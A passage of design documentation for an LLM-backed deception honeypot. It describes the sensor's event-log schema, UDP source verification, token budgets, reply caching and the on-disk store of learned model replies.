approval. No network connection. See [Portable formats](portable-formats.md).

## Data flow and trust boundaries

```
attacker --> SSH server ----+                       +--> reports/ (records, digests,
attacker --> listeners -----+--> event log --> agents     response runs, honeytokens)
                            |    quarantine       |  +--> detections/pending/
                            |    budget state     |  +--> connectors (opt-in)
                            |    sensor seed      |  +--> S3 event export (opt-in)
                            +<-- overlay <--------+
                            +<-- source state <---+
```

| Store | Written by | Read by | Docker volume |
|---|---|---|---|
| Event log, quarantine, budget state, sensor seed | SSH server, listeners | agents, operator console (read-only) | `frontend` |
| Overlay, per-source state | agents | SSH server, listeners, operator console (read-only) | `overlay` |
| Triage records, digests, response runs, approval queue, tuner snapshots, honeytoken registry, detection drafts, event export cursor | agents; operator console only with actions on (approval queue, blocklist, audit records) | operator, operator console | `agentdata` |
| `config.ini`, host key, `prompt.txt` | operator | all (read-only) | bind mount |

The sensor seed (`<data dir>/sensor_seed`, mode 0600, random on first start) drives every
generated record and honeytoken value, so a sensor keeps showing the same fake data across
restarts and rebuilds. `[scenario] seed` can set it explicitly. It is never derived from the
sensor name or anything else public.

Per-source state (`agents/source_state.py`) holds what playbooks decided about one source:
tags, tarpit delay (at most 5 s), budget mode (`deep` or `shallow`), fuller capture, and a
planted honeytoken. Each effect has its own expiry. The file is bounded to 10,000 entries;
over the bound, entries are evicted by priority (plain tags and tarpits first, planted
tokens last). Front-ends reload it when its modification time changes.

## Logging contract

All components append to one JSON-lines file. The SSH server uses upstream DECEIVE's
`JSONFormatter`; listener events (`listeners/events.py`) use the same top-level fields plus
an event type. This file is the only interface between front-ends and agents
(`agents/sessions.py` parses it).

Common fields:

| Field | Meaning |
|---|---|
| `timestamp` | UTC, ISO 8601 with milliseconds. |
| `level` | `INFO`, `WARNING` or `ERROR`. |
| `task_name` | Unique per connection (SSH: `session-<uuid>`; listeners: `<protocol>-<uuid>`). |
| `src_ip`, `src_port`, `dst_ip`, `dst_port` | Connection endpoints as seen by the process. |
| `message` | Human-readable event name. |
| `sensor_name` | `[honeypot] sensor_name`. |

SSH `message` values include `SSH connection received`, `User attempting to authenticate`,
`Authentication success` / `Authentication failed` (with `username` and `password`),
`User input` (base64 text in `details`, plus `interactive`), `LLM response` (base64 text in
`details`), `Session summary` (summary in `details`, `judgement` field: `BENIGN`,
`SUSPICIOUS`, `MALICIOUS`, or `UNKNOWN` when no summary was made, for example without a
model), `Budget exceeded`
(with `reason`), `Model error`, `Persona retry`, `Persona break`, `Reply cut`, `Learned reply`
(with `learned_id` and `learned_rule`), `Session timeout` and `SSH connection closed`. `LLM response` also
carries `reply_step`, the step that answered (see "Reply path and learned replies").

Listener events add:

| Field | Meaning |
|---|---|
| `sensor_protocol` | `sip`, `ftp`, `telnet`, `postgres`, `mysql`, `mssql`, `redis`, `smtp`, `http`, `mllp`, `s3` (SSH lines carry `ssh`). |
| `event` | `connection`, `auth_attempt`, `command`, `register`, `invite`, `options`, `limit`, `error`, `close`, `notice` (about the decoy itself, such as a cut persona reply). |
| `transport` | `tcp` or `udp`. |
| `username`, `password` | Submitted credentials, when the protocol reveals them. |
| `client` | Client software string (User-Agent, connect attributes). |
| `success` | `true` only for an accepted fake login or registration. |
| `data` | Up to 32 protocol-specific keys (for example `dialed`, `high_signal`, `signal`, `reason`, `sha256`). |

Every attacker-supplied value is length-capped (512 characters) and has control characters
escaped before it is written. Listener writes use `O_APPEND`, so lines from the SSH and
listener processes never interleave.

### Source proof

A UDP datagram's source address is whatever the sender wrote, so a SIP event over UDP may
name an address that never sent anything. Two flags say when the address is proven:

| Field | On | Meaning |
|---|---|---|
| `data.source_verified` | every SIP request event over UDP (not `error` or `limit` lines); SIP `invite` over either transport | `true` when the address has completed a nonce round trip with this listener: it was sent a challenge nonce and came back with it, so it can receive packets at that address. `false` otherwise. |
| `data.nonce_verified` | SIP `auth_attempt` (a REGISTER with credentials) and an answered `invite` | `true` when this request carries a nonce the trap issued to this same address. This is the round trip itself; it is what turns `source_verified` on for the address's later events. |

When they are set:

- An address becomes verified the first time a request from it carries a nonce issued to
  it. From then on its UDP events carry `source_verified: true`, including the event that
  proved it.
- The listener remembers the 10,000 most recently verified addresses, in memory only. An
  address that falls out of that list, or any address after a listener restart, is
  unverified again until it completes another round trip.
- Events from unverified UDP sources go through the low-value gate: the first of each kind
  per source, then periodic lines with a `suppressed` count. A missing line does not mean
  nothing arrived.
- TCP events (every other listener, SIP over TCP, and SSH) do not need the flag. A completed
  TCP handshake proves the address, so `transport: tcp` (or an SSH line) is proof on its
  own, and `source_verified` may be absent there.

A consumer that decides anything per address (blocking, alerting, reputation, counting
distinct attackers) should keep only events where `transport` is `tcp`, or
`data.source_verified` is `true`, or `data.nonce_verified` is `true`, and treat the rest
as unattributed volume. Without that filter a forged-source flood can put any address,
including a victim's or your own, into the result. Triage applies the same rule: campaigns
seen only over UDP without a round trip are marked `unverified_source`, never raise
severity, and never reach the blocklist candidates or Sigma drafts.

## Budgets

`agents/budget.py` enforces limits before any model call. When a limit would be exceeded the
model is not called: the attacker gets a canned error and the session closes, and a
`Budget exceeded` event with the reason is logged.

| Limit (`[budget]`) | Default |
|---|---|
| `max_line_bytes` (input is truncated) | 2048 |
| `max_commands_per_session` | 200 |
| `max_model_commands_per_session` (see below) | 50 |
| `max_tokens_per_session` | 400,000 |
| `max_tokens_per_ip_per_day` (IPv6 per /64) | 1,000,000 |
| `max_tokens_per_day` (global) | 3,000,000 |
| `max_concurrent_sessions` | 20 |
| `max_concurrent_sessions_per_ip` | 3 |
| `reply_cache_entries` (0 turns the reply cache off) | 2000 |
| `reply_cache_max_age` (seconds) | 21600 |

- The estimated cost (history length / 4 plus 512 output tokens) is reserved before the
  call and corrected from the provider's usage data afterwards, so concurrent sessions can
  overshoot a cap only by estimate error: admission is exact against estimates, but the
  correction after a call is applied late, so with several calls in flight a cap can be
  passed by the sum of their errors. Failed calls keep their charge.
- Daily counters live in a JSON file in the data directory (`state_file`), updated under
  an exclusive file lock, so the SSH server and the listeners on one host share the caps
  and a restart does not reset the day. A reservation is one transaction under that lock:
  it reloads the day's counters, checks the per-source and host-wide caps, and only then
  writes the charge, so two processes cannot both take the last of a cap, and a refused
  request charges nothing and does not count as a command. All of these limits are on
  estimated tokens, not on what the provider bills. A malformed file restarts the day from
  zero with a warning. If the file cannot be written, the caps still hold in memory and an
  error is logged (see `BUDGET STATE NOT PERSISTED`).
- A source in `shallow` mode (set by a playbook) gets canned replies only; `deep` doubles
  its per-session and per-source limits (the model cap too). The global cap never changes.
- `max_model_commands_per_session` counts the commands the model was asked, failed calls
  included (a failed call still reserved its cost). Cached replies are looked up first and
  still served past it. When a
  session reaches it, the session is not closed: every later command is answered by the
  deterministic shell, so an unknown command gets `command not found` and `exit` still
  ends the session. One `Model cap reached` event (with `limit`) is logged per session; the
  shell's answers are added to the history for the summary. Listener model calls (SQL,
  HTTP) stop at the same cap and get their protocol's error. There is no per-source
  counterpart: a source opening session after session to reset the cap is already bounded
  by `max_tokens_per_ip_per_day` and `max_concurrent_sessions_per_ip`.
- The reply cache (`agents/replycache.py`) keeps model replies in memory and serves one
  again, with no model call and no tokens, to a session whose history so far is identical.
  The key is a hash chained over the host (scenario and sensor seed), the login user,
  interactive or exec, the persona block, and every turn so far: each input line and the
  reply as the history holds it. Bots replay one script, so their sessions mostly hit. A
  hit is added to the history, counts toward `max_commands_per_session` but not the model
  cap, and counts as a model reply for the local-answer rule above. The session summary is
  cached the same way.
- A session uses the cache only while everything in its history is a function of its key:
  a local answer that read neither the clock nor the source address
  (`agents.shell.Answer.shareable`), a cached reply, or a model reply it has just stored.
  It leaves the cache for good, neither reading nor writing it, as soon as its history gets
  anything else: a local answer from `w`, `who`, `uptime`, `ps`, `/proc/uptime` or
  `/proc/loadavg` (clock or address), a model error or fallback, a reply past the model
  cap, a reply replaced because it broke character or misprinted an `echo`, or a model
  reply that was not stored. A source with a planted token or a `deep` or `shallow` mode
  never uses it, and neither does a session whose cache state was evicted (it never
  restarts from the root key). Not stored, as a second line: replies that end the
  session, replies that contain the session's address (whole, or cut to 16 characters as
  `w` cuts IPv6), replies to lines whose real output changes between runs (`date`,
  `uptime`, `ps`, `/dev/urandom`, `mktemp`, `openssl`, ...) and replies over 16 KB. The
  cache is bounded by `reply_cache_entries` (least recently used out first) and
  `reply_cache_max_age`, and is not kept across a restart, so a changed prompt, model or
  scenario never serves an old reply.
- Timing: a local or cached reply is as fast as a real shell, while a model reply takes
  the model's latency, so a script can tell which commands reach the model. The
  per-source tarpit does not cover this (it applies to flagged sources only, to every
  reply). `[llm] local_reply_delay_ms` (default 0, at most 2000) waits a random half to all
  of that time before a local, cached or capped reply in a model-backed session. It only
  narrows the gap, since model latency varies far more, and it slows every scripted bot,
  so it is off by default.
- `[llm] prompt_caching` marks the persona request for the provider's prompt cache. It is
  on by default for the Anthropic provider. For `aws` it is off by default and is used
  only when set to `true`, and then only for model ids containing `anthropic.` or
  `amazon.nova` (the families langchain-aws marks cache points for; other Bedrock models
  reject them). Not every model in those families accepts cache points, so if the first
  request with one is refused as invalid (Bedrock `ValidationException`, Anthropic 400),
  it is retried without the cache point and caching stays off until restart, with one
  `Prompt caching disabled` log line. It places one breakpoint on the last message, so the
  system prompt, persona block and the session so far are read from the provider's cache
  on the next command. Other providers are unchanged. The budget still charges the full
  token count the provider reports.
- Listener model calls (SQL, HTTP and Redis fallbacks) use the same budget, take a session slot,
  run at most `llm_max_inflight` at a time, and fail closed when no budget is initialised.
  One answer takes up to `[listeners] llm_attempts` requests (default 2, 1 to 3). When an
  answer fails the schema, the next request adds the caller's worked examples and one line
  naming the problem. A timeout or provider error ends the call. All requests share
  `llm_deadline` seconds (default 12, at most `llm_timeout`); a second request starts only
  with at least 1 second left. Each request reserves budget; a later request does not
  count as another model command. With `llm_attempts = 1` the one request gets
  `llm_timeout`. HTTP request events carry `rung` (`llm`, `llm_retry` or `fallback`). Telnet
  persona calls follow the SSH persona path, including `persona_retries`.
- Analyst calls are capped per run (`[agents] max_llm_calls_per_run`, shared by all stages)
  and per UTC day (`max_analyst_calls_per_day`).

SSH reads a whole line before the line cap applies (the SSH library buffers it), so a very
long line without a newline still costs memory before it is truncated.

### Reply path and learned replies

A persona command (SSH or Telnet) is answered by the first of these steps that can:

1. the deterministic shell, from the host profile (`local_shell_replies`, above);
2. the reply cache, for a session whose history so far is identical to one already seen;
3. a learned reply (`agents/learned.py`, `[llm] learned_replies`, on by default);
4. the deterministic shell, once the session reached `max_model_commands_per_session`;
5. the model.

Learned replies are the model's own earlier answers, kept on disk so that over time the
model is asked only for commands the sensor has not seen often enough. Every fresh model
reply sent as the model wrote it (not cut back to one round, retried, replaced for
breaking character or misprinting an `echo`, and not a fallback, budget or model-cap
reply) is one observation of its command. An entry is served once its reply was observed
in at least `learned_min_sessions` sessions (default 3), from at least two source
networks (/24 for IPv4, /64 for IPv6), after at least two different sequences of earlier
input lines, and never with any other reply. A session's first command (the opener is
not a command) is also served when the observations made as first commands alone meet
the session and network counts: those sessions all started in the same state, and an SSH
exec session has no other command. An entry observed once with a different reply, or with
a reply that cannot be stored (it moved the prompt, names the source address, or holds a
trace of a token), is marked varying and is never served, which keeps commands whose
output depends on the clock, on randomness or on what the session did with the model.

A second rule serves replayed scripts, whose later lines always follow the same earlier
lines. Each session keeps a script digest: a hash chained from the host fingerprint, the
login user and interactive or exec, over every command line in order and the reply as
sent. Random-looking tokens are numbered once per session and replaced by that number in
both the line and the reply, so two runs of a script that differ only in their random
markers share a digest. The output of a line that reads the clock or the source address
(the volatile list above, or a local answer from `w`, `uptime` and the like) is left out
of the chain; the line itself is kept. A command is served when this entry was observed
with the identical reply under the session's current digest in at least
`learned_min_sessions` sessions from at least two networks, and only when the line's
tokens are bound the same way: each token in the line is the same earlier token of the
session, or a new one, as in the teaching sessions, so `cat /tmp/B` after
`echo A > /tmp/A` never gets the reply taught for `cat /tmp/A`. Such a session typed exactly
what those sessions typed and was shown exactly what they were shown, so it is in their
state, and this rule ignores the state-changing check below: a script that writes a file
and reads it back is answered in full. The reply is stored whole, prompt included. A
token that an earlier line wrote and a later line reads back appears in the stored reply
as its session number, so a session is shown its own token, never one from the sessions
that taught it; a reply that holds a token in any other form (a piece of it, another
case, its base64 or hex decoding) cannot be stored and marks that history varying.
Evidence and the varying mark are kept per digest, so a command that differs between
scripts can still be served within each one: up to 64 digests per entry, of which at most
16 hold reply text (the others keep a digest of their reply until they reach the
threshold); past either cap the least recently seen digest of that kind goes, varying
mark included. A line that computes over its text (the programs and forms listed below)
in a session that has tokens is chained but neither served nor observed by this rule.
The token lengths and classes are part of the digest, and when every teaching session
used the same token values, the reply is served only to a session with those same values:
a reply can depend on a value in ways a trace check cannot see (its length, a count), so
other values need evidence from at least two different sets. The session opener is learned under
this rule too, and is not part of the chain, since banners may differ. A session leaves
this rule for good when a line cannot be made a template (more than 8 distinct tokens in
the session, a control character, over 512 characters), when it is refused by the budget,
or when its state was evicted. A served reply continues the chain, so after a restart a
whole script that three sessions ran is answered line by line with no model request. Each
`Learned reply` event carries `learned_rule`: `history` or `script`.

- Templates. Random-looking tokens in a command (a UUID, a run of 16 or more hex digits,
  a run of 20 or more base64 characters mixing upper case, lower case and digits) become
  numbered placeholders, one number per distinct value, and the reply holds the same
  placeholders wherever a value appears verbatim. A reply that holds a piece of a token,
  a token in another case, a token's base64 or hex decoding, or a random-looking token
  that is not in the command is not learned. Serving fills in the new command's values,
  but a value the teaching sessions did not use is served only once their observations
  span two or more different sets of values: a reply can depend on a value in ways no
  trace check sees (its length, a count). Both rules apply this.
- Token shape and computed output. Each token's length and character class (digits,
  lower-case hex, upper-case hex, mixed-case hex, UUID, base64-like) is part of an
  entry's key, so an answer seen for 20-character hex tokens never stands for a
  30-character or an all-digit one. Placeholders also keep each token's position and
  whether it repeats (`cp A A` and `cp A B` are different entries). A command that
  computes over its text (`wc`, `printf`, `expr`, `awk`, `sed`, `cut`, `head`, `tail`,
  `tr`, `base64`, `od`, checksums, `grep`, scripting languages, `$((...))`, `${...}`, and
  the like; `learned.COMPUTERS`) is learned only for its exact text, never with
  placeholders. A reply that holds two or more different tokens is not learned, because
  their order can follow their values (`ls` sorts names).
- Prompt. An interactive reply is stored without its final prompt and only when that
  prompt is the one the session showed before the command; serving adds the session's
  current prompt. An exec reply is stored whole.
- Session state. A session teaches and gets learned replies only while none of its lines
  so far could change what a later command prints: no redirect into a file (`/dev/null`
  aside), no variable assignment, no program that writes, moves, downloads, changes
  users, directory or environment, or runs other code (`cd`, `wget`, `chmod`, `sh`,
  `sudo rm`, `./x`, `/tmp/x`, ...; `learned.WRITERS`). A learned reply was made on a
  host in its starting state, so it is served only to a session still in that state. The
  session opener does not count. A session whose state was evicted is out for good.
- Not used: lines whose real output changes between runs (the reply cache's list:
  `date`, `uptime`, `ps`, `/dev/urandom`, ...), replies that end the session or contain
  the source address, sources with a planted token or a `deep` or `shallow` mode,
  commands over 512 characters or with control characters, replies over 8 KB or with
  control characters other than line endings and tabs.
- Keys. An entry is keyed by the host fingerprint (hostname, kernel, sensor seed, the
  persona block, the profile facts, the `[llm]` provider and model, and the system and
  persona prompt text the front-end was started with), the login user, interactive or exec, and the command template. A changed
  scenario, tuner overlay, model or prompt starts from nothing.
- A learned reply counts toward `max_commands_per_session`, not the model cap, costs no
  tokens, is added to the session history as a model reply would be, counts as a model
  reply for the local-answer rule and for the session summary, and keeps the session in
  or out of the reply cache as a cached reply does. `local_reply_delay_ms` applies.
- Storage. `learned_replies.json` beside `[budget] state_file`, at most 64 MB written
  (past that, entries that are not served go first), mode 0600, read and
  written under an exclusive lock on `learned_replies.json.lock` and replaced atomically,
  so the SSH server and the listeners (Telnet) share it. At most `learned_max_entries`
  entries (default 2000, at most 3000); past that, entries that are not served go first,
  least recently seen first. Each entry keeps at most 16 sessions' observations (the
  first ones) and counts up to 16 source networks. Every entry read back is checked
  again (lengths, printable text, placeholders) and dropped when it fails. A read, write
  or lock failure sends the command to the model. With `learned_replies = false` no file
  is read or written.
- The file holds a version line, then one entry per line, so a reload decodes it in
  small pieces; a write reuses the lines of entries that did not change, and a process
  that wrote the file last does not read it back before its next write.
- No session waits on the file. Recording an observation, writing the served counts and
  reloading a file another process changed all run in one worker thread of the process,
  fed by a queue of at most 256 jobs; the reply path only adds to the queue. When the
  queue is full the observation is dropped and counted, with a warning at most once a
  minute. Lookups read the in-memory copy; when the file's inode, size or modification
  time changed they ask the worker for a reload (one at a time) and use the copy they
  have until the new one replaces it whole. At start the worker reads the file once, and
  at shutdown the SSH server and the listeners wait for the queue to drain.
- Events. A served reply logs `Learned reply` (`learned_id`, `learned_rule`; Telnet: a
  `notice` with the same `data`). Every SSH `LLM response` carries `reply_step` (`local`, `cached`,
  `learned`, `capped`, `model`, `fallback`, `budget`, `offline`, or `opener`), and every
  Telnet persona `Telnet input` carries `data.step`.

`python -m agents learned` reads and edits the store (plain text on standard output, with
stored text escaped; no run lock, no model):

| Option | What it prints or does |
|---|---|
| `--stats` (default) | Entries, served entries, varying entries, times served, and the share of commands answered by each step in the event log. |
| `--list` | Up to 200 entries, newest first: id, user, `tty` or `exec`, counts, state, command and reply templates. |
| `--candidates` | The command templates that reach the model most often and are not served, with how often they were asked, the source networks that asked, and what each still needs. These are the commands worth a canned answer. |
| `--forget ID` | Drops one entry (the 16-character id from `--list`). |
| `--clear` | Drops every entry. |

The running processes pick up a change to the file shortly after their next lookup. Reading needs no
lock (the file is only ever replaced whole), so `--stats`, `--list` and `--candidates`
work from a read-only mount such as the `agents` container's view of the `frontend`
volume; `--forget` and `--clear` need write access, so run them where the store is
writable (in Docker, a container that mounts the `frontend` volume read-write), and a
failed read or write is reported as an error.
